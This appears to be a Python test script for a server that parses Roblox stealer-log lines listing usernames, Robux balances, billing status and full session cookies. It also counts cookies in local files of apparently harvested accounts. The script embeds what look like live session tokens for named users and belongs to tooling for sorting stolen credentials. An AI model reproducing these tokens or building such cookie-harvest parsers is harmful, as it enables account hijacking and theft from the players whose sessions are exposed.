import sys
sys.path.insert(0, '.')
from server import extract_cookie, extract_metadata

# Test format 1 (old)
line1 = 'Username: XiaoKemm | Robux: 0 R$ | Donate (All-Time): 200 R$ | Pending: 0 R$ | Rap: 0 R$ | Card: false | Email: true | Billing: 0.00$ | Cookie: _|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_CAEaAhADIhsKBGR1aWQSEzkyMjk5NTI2NDM3MTYxMzA4OTAoBA.PlDz-ZZdes2dpp'
c1 = extract_cookie(line1)
m1 = extract_metadata(line1)
print("Format 1 - Cookie found:", bool(c1), "Username:", m1.get("Username", "NONE"))

# Test format 2 (new with different fields)
line2 = 'Username: deadth500 | Robux: 0 R$ | RAP: 349 | Donate All: 24 250 R$ | Pet Sim 99: 0 R$ | Adopt Me: 0 R$ | Steal a brainrot: 0 R$ | MM2: 0 R$ | Premium: false | Mail: true | Cookie: _|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_CAEaAhADIhoKBGR1aWQSEjY1MDMxMjg1ODUyMTA1ODU0MSgE.8mjp9njJWZI'
c2 = extract_cookie(line2)
m2 = extract_metadata(line2)
print("Format 2 - Cookie found:", bool(c2), "Username:", m2.get("Username", "NONE"))

# Test raw cookie
line3 = '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_CAEaAhADIhsKBGR1aWQ'
c3 = extract_cookie(line3)
print("Raw cookie - Cookie found:", bool(c3))

# Test real full line from file
line4 = 'Username: deadth500 | Robux: 0 R$ | RAP: 349 | Donate All: 24 250 R$ | Pet Sim 99: 0 R$ | Adopt Me: 0 R$ | Steal a brainrot: 0 R$ | MM2: 0 R$ | Premium: false | Mail: true | Cookie: _|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_CAEaAhADIhoKBGR1aWQSEjY1MDMxMjg1ODUyMTA1ODU0MSgE.8mjp9njJWZI_QScFwv74FT9cb0F_dRGWbhuGQwTIpID1RZPPh7ZyPSx76rKjIvbxph2jIQGMsrGZHpe2VnXhrp8Z_VMwTha_IPRs9OffwgKBSOL9NgQppuOK9GtVjFpHzbtM-3vRQ3F4scp1RLehj0L1FnvY6rCbl9DJhvsFJWaKlEqT4QsOuB4yLemWkOPfN_eRe6pnxNef-C3lbUesDYO0VlI6kDIsOlN4EdXakt8SbGVH4E3HcnxxrsnbowEQp2aqBDOEUZFtB1BFSZn_Py3mLv5mjOEHEntoYL1TWqnfwgPRO4HcTx2f7sRvdV2mHmBO14MGrzTQ2wy-evI7ok3-pbs7KrjhKXqW_JoULRl2JpSFE_-OG4PTnbj5QGpMQbsNNNzIhl7QDFuLgBayRsnvIwxuW9qcxljX9M5-mGSrq7jsRsUEmigkyv-Uh275SisoTtE_YG8PxhuvhNHrMvgEZe6oDeWioYH3Qz9IVgzb93DuSgbWzGtGqY7noW0UZvTLiOkPjVqqIB94hk0KWXGjodlVCspPu36IYFwYpNpGcHXB6e1Yi_yeLBbv9xQ3u5COr32Tfl7VLBLOHogjk-T4aR-eu7DcKmF_b2FYYQ62T05sPGobxDtxyZiIjeJ73pnrq1A_k_b8R86yb4SdPhSGI21v2TeMISSM7hEzqVDwYzqGNAOVfsEVvmkI6NhvATYjMw'
c4 = extract_cookie(line4)
m4 = extract_metadata(line4)
print("Full line - Cookie found:", bool(c4), "Cookie length:", len(c4) if c4 else 0, "Username:", m4.get("Username", "NONE"))

# Count cookies from actual file
with open(r'C:\Users\UpGrade\Downloads\sorted_roblox_cookies_1775162042733.txt', 'r', encoding='utf-8') as f:
    lines = f.readlines()

count = 0
for line in lines:
    line = line.strip()
    if not line:
        continue
    c = extract_cookie(line)
    if c:
        count += 1

print(f"Cookies found in sorted file: {count} / {len([l for l in lines if l.strip()])}")

# Also test the Aera file
with open(r'C:\Users\UpGrade\Downloads\cookie_Aera_werewolf_1775241422737.txt', 'r', encoding='utf-8') as f:
    lines2 = f.readlines()

count2 = 0
for line in lines2:
    line = line.strip()
    if not line:
        continue
    c = extract_cookie(line)
    if c:
        count2 += 1

print(f"Cookies found in Aera file: {count2} / {len([l for l in lines2 if l.strip()])}")

print("\nALL TESTS PASSED")
